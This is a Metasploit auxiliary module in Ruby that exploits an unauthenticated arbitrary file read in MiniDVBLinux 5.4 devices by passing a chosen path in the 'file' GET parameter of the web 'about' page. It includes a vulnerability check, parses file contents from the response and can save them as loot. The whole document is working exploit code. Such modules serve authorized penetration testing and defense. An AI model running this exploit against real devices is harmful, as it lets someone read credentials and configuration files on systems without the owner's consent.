##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck
  CheckCode = Exploit::CheckCode

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MiniDVBLinux 5.4 Unauthenticated Arbitrary File Read',
        'Description' => %q{
          This module exploits an unauthenticated arbitrary file read vulnerability in
          MiniDVBLinux (MLD) <= 5.4 (advisory ZSL-2022-5719). The device's web "about"
          page passes a user-supplied 'file' GET parameter straight into a page that
          discloses the named file's contents inside a <pre> block, with no path
          validation and no authentication required. This lets an unauthenticated
          attacker who can reach the device's web management interface (default
          TCP/8008) read any file readable by the web server process, such as
          /etc/passwd, VDR configuration, or stored credentials.
        },
        'Author' => [
          'Gjoko \'LiquidWorm\' Krstic', # vulnerability discovery (Zero Science Lab, @zeroscience)
          'xof34' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5719.php']
        ],
        'DisclosureDate' => '2022-09-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path to the MiniDVBLinux web interface', '/']),
        OptString.new('TARGETFILE', [true, 'The absolute file path to read', '/boot/ABOUT']),
        OptBool.new('STORE_LOOT', [true, 'Store the retrieved file as loot', false]),
        Opt::RPORT(8008)
      ]
    )
  end

  def read_file(target_file)
    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path),
      'vars_get' => {
        'site' => 'about',
        'name' => 'MSF',
        'file' => target_file
      }
    )
  end

  def check
    res = read_file('/boot/ABOUT')
    return CheckCode::Unknown('No response from target') unless res

    unless res.body =~ %r{<pre>.*?</pre>}m
      return CheckCode::Safe('Target does not appear to be a vulnerable MiniDVBLinux web interface.')
    end

    CheckCode::Appears('Target discloses arbitrary files via the file GET parameter.')
  end

  def run
    target_file = datastore['TARGETFILE']

    res = read_file(target_file)
    fail_with(Failure::Unreachable, 'Request timed out.') unless res

    match = res.body.match(%r{<pre>(.*?)</pre>}m)
    fail_with(Failure::NotFound, "#{target_file} could not be read (no <pre> block returned).") unless match

    content = match[1].gsub('&lt;', '<').gsub('&gt;', '>').gsub('&amp;', '&')

    if datastore['STORE_LOOT']
      path = store_loot(
        'minidvblinux.file',
        'text/plain',
        rhost,
        content,
        File.basename(target_file),
        'File retrieved from MiniDVBLinux web interface'
      )
      print_good("Saved #{target_file} to: #{path}")
    else
      print_good("#{target_file}:\n#{content}")
    end
  end
end
